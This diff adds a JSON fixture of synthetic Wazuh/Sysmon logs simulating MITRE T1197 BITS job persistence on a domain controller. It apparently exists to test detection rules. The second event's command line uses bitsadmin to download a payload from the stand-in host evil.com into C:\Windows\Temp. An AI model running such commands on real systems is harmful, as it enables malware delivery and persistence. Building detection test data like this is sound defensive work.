@@ -1,0 +1,124 @@
+{
+  "_metadata": {
+    "attack_id": "T1197",
+    "variation": "001",
+    "name": "BITS Job Creation for Persistence",
+    "description": "Attacker creates BITS job for file download or persistence",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "persistence",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - bitsadmin create job",
+      "sequence": 1,
+      "timestamp": "2026-02-04T21:01:00.000Z",
+      "log": {
+        "timestamp": "2026-02-04T21:01:00.000Z",
+        "rule": {
+          "level": 3,
+          "description": "Sysmon - Event 1: Process Create",
+          "id": "100900",
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706910002.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.Pooka.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-04 21:01:00.000",
+              "processGuid": "{DC01-PM02-0001-0001-000000000001}",
+              "processId": "5010",
+              "image": "C:\\Windows\\System32\\bitsadmin.exe",
+              "commandLine": "bitsadmin /create phantom_job",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "POOKA\\Administrator",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{DC01-PM02-0001-0001-000000000000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - bitsadmin addfile",
+      "sequence": 2,
+      "timestamp": "2026-02-04T21:01:05.000Z",
+      "log": {
+        "timestamp": "2026-02-04T21:01:05.000Z",
+        "rule": {
+          "level": 3,
+          "description": "Sysmon - Event 1: Process Create",
+          "id": "100900",
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1706910002.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.Pooka.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-04 21:01:05.000",
+              "processGuid": "{DC01-PM02-0002-0001-000000000001}",
+              "processId": "5011",
+              "image": "C:\\Windows\\System32\\bitsadmin.exe",
+              "commandLine": "bitsadmin /addfile phantom_job http://evil.com/payload.exe C:\\Windows\\Temp\\payload.exe",
+              "currentDirectory": "C:\\Users\\Administrator\\",
+              "user": "POOKA\\Administrator",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{DC01-PM02-0002-0001-000000000000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
